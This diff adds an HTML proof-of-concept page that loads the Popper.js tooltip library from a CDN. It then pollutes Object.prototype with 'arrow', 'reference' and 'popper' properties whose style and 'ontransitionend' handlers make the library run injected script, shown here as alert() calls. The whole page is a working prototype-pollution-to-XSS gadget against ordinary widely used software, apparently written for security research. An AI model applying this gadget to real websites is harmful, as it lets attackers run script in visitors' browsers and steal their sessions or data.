@@ -1,0 +1,14 @@
+<button id="button" aria-describedby="tooltip">Button</button>
+<div id="tooltip" role="tooltip">Tooltip<div data-popper-arrow></div></div>
+
+<script src="https://unpkg.com/@popperjs/core@2"></script>
+<script>
+	Object.prototype.arrow={"style":"color:red;transition:all 1s","ontransitionend":"alert(1)"}
+	Object.prototype.reference={"style":"color:red;transition:all 1s","ontransitionend":"alert(2)"}
+	Object.prototype.popper={"style":"color:red;transition:all 1s","ontransitionend":"alert(3)"}
+</script>
+<script>
+  const button = document.querySelector('#button');
+  const tooltip = document.querySelector('#tooltip');
+  const popperInstance = Popper.createPopper(button, tooltip);
+</script>
